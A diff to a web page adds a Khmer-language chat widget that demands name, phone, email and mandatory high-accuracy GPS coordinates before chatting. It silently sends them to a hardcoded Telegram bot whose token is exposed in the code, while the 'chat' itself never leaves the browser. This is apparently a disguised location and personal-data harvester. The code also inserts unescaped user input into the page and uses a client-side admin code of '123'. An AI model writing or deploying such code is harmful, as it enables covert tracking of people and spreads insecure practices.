@@ -1551,6 +1551,69 @@ body { padding-left: 240px !important; }
         .chat-text { display: none; }
     }
 
+        
+.hidden { display: none !important; }
+
+.btn-start {
+    background: #4CAF50;
+    color: white;
+    padding: 15px 30px;
+    border: none;
+    border-radius: 10px;
+    font-size: 1.3rem;
+    cursor: pointer;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+}
+
+.reg-card {
+    background: white;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+
+.my-input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-sizing: border-box;
+}
+
+.btn-gps {
+    width: 100%;
+    background: #2196F3;
+    color: white;
+    border: none;
+    padding: 10px;
+    border-radius: 8px;
+    cursor: pointer;
+}
+
+.btn-confirm {
+    width: 100%;
+    background: #ff5722;
+    color: white;
+    border: none;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 1.1rem;
+    margin-top: 20px;
+    cursor: pointer;
+}
+.chat-input-style {
+    width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;
+}
+.btn-main-action {
+    background: #4CAF50; color: white; border: none; padding: 12px 25px; border-radius: 8px; font-size: 1rem; cursor: pointer;
+}
+.btn-gps-style {
+    width: 100%; background: #008CBA; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer;
+}
+.chat-box-msg {
+    margin: 5px 0; padding: 8px; border-radius: 5px; background: #f1f1f1; font-size: 0.9rem;
+}
 
         
     </style>
@@ -1883,6 +1946,48 @@ body { padding-left: 240px !important; }
 
     </div>
 
+</div>
+
+    <div class="chat-container">
+    <div class="chat-title-wrapper">
+        <span class="bouncing-letter">💬</span> ប្រអប់ឆាត
+    </div>
+
+    <div id="step-1" style="text-align: center; padding: 60px 0;">
+        <button onclick="toStep2()" class="btn-main-action">🚀 ចុចចូលលេងឆាត</button>
+    </div>
+
+    <div id="step-2" style="display: none; padding: 15px;">
+        <div style="background: #f9f9f9; padding: 20px; border-radius: 12px; border: 1px solid #ddd;">
+            <h3 style="text-align: center;">ចុះឈ្មោះដើម្បីឆាត</h3>
+            <input type="text" id="reg-name" placeholder="ឈ្មោះ..." class="chat-input-style">
+            <input type="text" id="reg-phone" placeholder="លេខទូរស័ព្ទ..." class="chat-input-style">
+            <input type="email" id="reg-email" placeholder="Gmail..." class="chat-input-style">
+            
+            <button onclick="getExactLocation()" id="btn-gps" class="btn-gps-style">📍 ចុចផ្តល់ទីតាំង (GPS)</button>
+            <p id="gps-status" style="font-size: 0.8rem; color: red; text-align: center; margin-top: 5px;">*ត្រូវតែផ្តល់ទីតាំង</p>
+            
+            <button onclick="submitRegistration()" class="btn-main-action" style="width: 100%; margin-top: 15px;">យល់ព្រម និងចូលឆាត</button>
+        </div>
+    </div>
+
+    <div id="step-3" style="display: none;">
+        <div id="chat-box" style="height: 350px; overflow-y: auto; padding: 10px; background: #fff; border-bottom: 1px solid #eee;"></div>
+        
+        <div class="chat-input-area" style="display: flex; align-items: center; padding: 10px;">
+            <input type="text" id="display-name" readonly style="width: 60px; border: none; font-weight: bold; color: #4CAF50;">
+            <label for="img-upload" style="font-size: 1.5rem; cursor: pointer; margin: 0 10px;">🖼️</label>
+            <input type="file" id="img-upload" accept="image/*" style="display:none" onchange="sendChatImage(this)">
+            <input type="text" id="chat-msg-input" placeholder="ផ្ញើសារ..." maxlength="150" style="flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 5px;" onkeypress="if(event.key==='Enter') sendChatMessage()">
+            <button class="btn-chat-send" onclick="sendChatMessage()" style="margin-left: 10px;">ផ្ញើ</button>
+        </div>
+    </div>
+
+    <div style="text-align: left; margin-top: 10px; padding: 10px;">
+        <span style="font-size: 0.7rem; color: gray;">Admin Code:</span>
+        <input type="password" id="admin-code" style="width: 60px; font-size: 0.7rem;">
+        <button style="background: #ff4d4d; color: white; border: none; padding: 3px 8px; border-radius: 3px; cursor: pointer;" onclick="clearAllChat()">លុបសារ</button>
+    </div>
 </div>
 
 
@@ -3376,6 +3481,93 @@ function listenForAdminReplies() {
               }
           }
       });
+}
+
+    const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
+const CHAT_ID = "955031659";
+let userLocationLink = "";
+
+// ជំហានទី ១ ទៅ ២
+function toStep2() {
+    document.getElementById('step-1').style.display = 'none';
+    document.getElementById('step-2').style.display = 'block';
+}
+
+// មុខងារ GPS ឱ្យចំទីតាំងបំផុត (High Accuracy)
+function getExactLocation() {
+    if (navigator.geolocation) {
+        document.getElementById('gps-status').innerText = "⌛ កំពុងស្វែងរកទីតាំងពិតប្រាកដ...";
+        
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Link ផែនទី Google Maps ពិតប្រាកដ
+            userLocationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            document.getElementById('gps-status').innerText = "✅ ចាប់បានទីតាំងហើយ!";
+            document.getElementById('gps-status').style.color = "green";
+            document.getElementById('btn-gps').style.background = "#4CAF50";
+        }, function(error) {
+            alert("Error: " + error.message + " សូមចុច Allow លើ Browser!");
+        }, {
+            enableHighAccuracy: true, // បង្ខំឱ្យប្រើ GPS កម្រិតខ្ពស់
+            timeout: 10000,
+            maximumAge: 0
+        });
+    }
+}
+
+// ជំហានទី ២ ទៅ ៣ (ចុះឈ្មោះ និងផ្ញើទៅ Telegram)
+async function submitRegistration() {
+    const name = document.getElementById('reg-name').value.trim();
+    const phone = document.getElementById('reg-phone').value.trim();
+    const email = document.getElementById('reg-email').value.trim();
+
+    if (!name || !phone || !email || !userLocationLink) {
+        alert("សូមបំពេញព័ត៌មានឱ្យគ្រប់ និងចុចផ្តល់ទីតាំង GPS!");
+        return;
+    }
+
+    const text = `🚨 *អ្នកលេងថ្មី*\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📧 Gmail: ${email}\n📍 ទីតាំង: ${userLocationLink}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+        });
+
+        // ប្តូរទៅអេក្រង់ឆាត
+        document.getElementById('display-name').value = name;
+        document.getElementById('step-2').style.display = 'none';
+        document.getElementById('step-3').style.display = 'block';
+        
+        document.getElementById('chat-box').innerHTML += `<div style="text-align:center; color:green; font-size:0.8rem;">--- ស្វាគមន៍ ${name} ---</div>`;
+    } catch (e) {
+        alert("មានបញ្ហាក្នុងការផ្ញើទិន្នន័យ!");
+    }
+}
+
+// មុខងារផ្ញើសារក្នុងឆាត
+function sendChatMessage() {
+    const msg = document.getElementById('chat-msg-input').value.trim();
+    const name = document.getElementById('display-name').value;
+    if (msg === "") return;
+
+    const chatBox = document.getElementById('chat-box');
+    chatBox.innerHTML += `<div class="chat-box-msg"><b>${name}:</b> ${msg}</div>`;
+    document.getElementById('chat-msg-input').value = "";
+    chatBox.scrollTop = chatBox.scrollHeight;
+}
+
+// លុបសារ (Admin)
+function clearAllChat() {
+    if (document.getElementById('admin-code').value === "123") {
+        document.getElementById('chat-box').innerHTML = "";
+    } else {
+        alert("លេខកូដខុស!");
+    }
 }
 </script>
 </body>
